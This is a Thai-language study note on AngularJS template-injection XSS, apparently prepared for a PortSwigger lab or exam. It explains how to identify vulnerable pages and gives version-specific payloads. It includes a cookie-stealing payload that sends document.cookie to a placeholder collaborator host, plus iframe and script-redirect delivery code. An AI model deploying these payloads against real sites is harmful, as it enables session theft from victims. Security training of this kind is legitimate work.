# Pattern 1: AngularJS Template Injection
> [Back to Index](../README.md) | [Back to DOM XSS Overview](../02-DOM-XSS-Overview.md)

---

## AngularJS คืออะไร?

**AngularJS = JavaScript Framework สำหรับสร้าง Web Application**

```
AngularJS ใช้ Template Syntax พิเศษ: {{ expression }}

ตัวอย่าง:
<div>Hello, {{ username }}</div>

ถ้า username = "John"
ผลลัพธ์: Hello, John
```

## ทำไม AngularJS ถึงมีช่องโหว่ XSS?

**ปัญหา: AngularJS จะ evaluate (ประมวลผล) ทุกอย่างใน `{{ }}`**

```
ปกติ:
{{ 7 * 7 }}  →  แสดง 49

แต่ถ้า Attacker ใส่:
{{ constructor.constructor('alert(1)')() }}

→ AngularJS evaluate → alert(1) execute! 🔴
```

## ทำไม AngularJS XSS พิเศษ?

```
ปกติ XSS ใช้ HTML tags:
<script>alert(1)</script>  → ถูก encode เป็น &lt;script&gt;

แต่ AngularJS payload:
{{$on.constructor('alert(1)')()}}  → ไม่มี < > หรือ " เลย!
                                   → ไม่ถูก encode
                                   → Execute ได้!
```

---

## วิธี Identify

**ต้องมี 2 อย่างครบ:**

```
┌─────────────────────────────────────────────────────────┐
│                                                         │
│   angular.js loaded    +    ng-app directive            │
│   (เครื่องยนต์)              (สวิตช์เปิด)               │
│                                                         │
│        ↓                         ↓                      │
│   ให้ความสามารถ            บอกว่าเริ่มที่ไหน            │
│                                                         │
│              ทั้งคู่ครบ = AngularJS ทำงาน               │
│              {{ }} จะถูก evaluate                       │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

**Step 1: หา ng-app ใน HTML**

```html
<!-- ng-app = บอก AngularJS ว่า "เริ่มทำงานตรงนี้" -->
<html ng-app>           <!-- ควบคุมทั้งหน้า -->
<body ng-app>           <!-- ควบคุมทั้ง body -->
<div ng-app="myApp">    <!-- ควบคุมเฉพาะ div นี้ -->
```

**Step 2: หา angular.js loaded**

```html
<!-- angular.js = ไฟล์ที่ทำให้ AngularJS ทำงาน -->
<script src="/js/angular.min.js"></script>
<script src="/js/angular-1.7.7.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
```

**Step 3: ทดสอบด้วย `{{7*7}}`**

```
URL: https://target.com/search?q={{7*7}}

ถ้า response แสดง "49" แทน "{{7*7}}"
→ มี AngularJS Template Injection! 🔴
```

---

## Payload อธิบาย

**Basic Payload:**
```javascript
{{$on.constructor('alert(1)')()}}
```

**แยกส่วนอธิบาย:**

| Part | ความหมาย |
|------|----------|
| `{{ }}` | AngularJS template syntax |
| `$on` | AngularJS scope object |
| `.constructor` | ได้ Function constructor |
| `.constructor('alert(1)')` | สร้าง function ใหม่ที่มี code `alert(1)` |
| `()` | เรียก function นั้น |

**เหมือนกับ:**
```javascript
// Payload นี้:
{{$on.constructor('alert(1)')()}}

// เท่ากับ:
new Function('alert(1)')()

// เท่ากับ:
eval('alert(1)')
```

---

## Payloads

```javascript
// Basic alert
{{constructor.constructor('alert(1)')()}}

// Version 1.6+ (ใช้บ่อยใน exam)
{{$on.constructor('alert(1)')()}}

// Cookie Stealer
{{$on.constructor('document.location="https://COLLABORATOR?c="+document.cookie')()}}
```

### Different AngularJS Versions

| Version | Payload |
|---------|---------|
| 1.0.1 - 1.1.5 | `{{constructor.constructor('alert(1)')()}}` |
| **1.6+ (ใช้บ่อย)** | `{{$on.constructor('alert(1)')()}}` |

---

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                  AngularJS XSS Attack Flow                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Attacker พบว่าเว็บใช้ AngularJS                             │
│     └── เจอ ng-app ใน HTML                                      │
│     └── เจอ angular.js loaded                                   │
│                                                                 │
│  2. Attacker ทดสอบ {{7*7}}                                      │
│     └── Response แสดง 49 → Vulnerable!                          │
│                                                                 │
│  3. Attacker สร้าง Cookie Stealer payload                       │
│     └── {{$on.constructor('document.location=...')()}}          │
│                                                                 │
│  4. Attacker วาง payload บน Exploit Server                      │
│     └── ใส่ใน iframe หรือ script redirect                       │
│                                                                 │
│  5. Attacker กด "Deliver exploit to victim"                     │
│                                                                 │
│  6. Victim คลิก → AngularJS evaluate → Cookie ถูกส่งไป          │
│     Burp Collaborator!                                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Exploit Server Delivery

**วิธีที่ 1: Script redirect**
```html
<script>
location = "https://TARGET.net/?search={{$on.constructor('document.location=\"https://COLLABORATOR?c=\"%2bdocument.cookie')()}}";
</script>
```

**วิธีที่ 2: iframe**
```html
<iframe src="https://TARGET.net/?search={{$on.constructor('document.location=%22https://COLLABORATOR?c=%22%2bdocument.cookie')()}}">
</iframe>
```

---

## Link ที่ส่งให้ Victim

**Link ที่ส่งให้ Victim = Link ของ Exploit Server (ของ Attacker) ✅**

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  Link ที่ส่งให้ Victim:                                         │
│  https://exploit-server.net/exploit  ← Exploit Server ของเรา   │
│                                                                 │
│  ไม่ใช่:                                                        │
│  https://target-website.net/...      ← Target Website           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Visual Flow:**

```
                    1. ส่ง link Exploit Server
    ATTACKER ─────────────────────────────────────► VICTIM
                                                      │
                                                      │ 2. Victim คลิก
                                                      ▼
                                               ┌──────────────┐
                                               │   EXPLOIT    │
                                               │   SERVER     │
                                               └──────┬───────┘
                                                      │
                                                      │ 3. iframe โหลด Target
                                                      ▼
                                               ┌──────────────┐
                                               │   TARGET     │
                                               │   WEBSITE    │
                                               └──────┬───────┘
                                                      │
                                                      │ 4. Cookie ถูกส่ง
                                                      ▼
                                               ┌──────────────┐
    ATTACKER ◄─────────────────────────────────│    BURP      │
                    5. Attacker ได้ cookie      │ COLLABORATOR │
                                               └──────────────┘
```

---

## Checklist

```
┌────────────────────────────────────────────────────────────┐
│                 AngularJS XSS Checklist                    │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  ✓ หา ng-app ใน HTML                                      │
│  ✓ หา angular.js script                                   │
│  ✓ ทดสอบ {{7*7}} → ถ้าได้ 49 = vulnerable                 │
│  ✓ Payload: {{$on.constructor('alert(1)')()}}             │
│  ✓ Cookie: {{$on.constructor('document.location=...')()}} │
│  ✓ ไม่ต้องใช้ < > หรือ " → bypass HTML encoding ได้       │
│  ✓ Cookie ต้องไม่มี HttpOnly flag ถึงจะขโมยได้            │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

---

## Lab Reference
- [PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

---

> **Next:** [pattern-2-document-write.md](pattern-2-document-write.md)
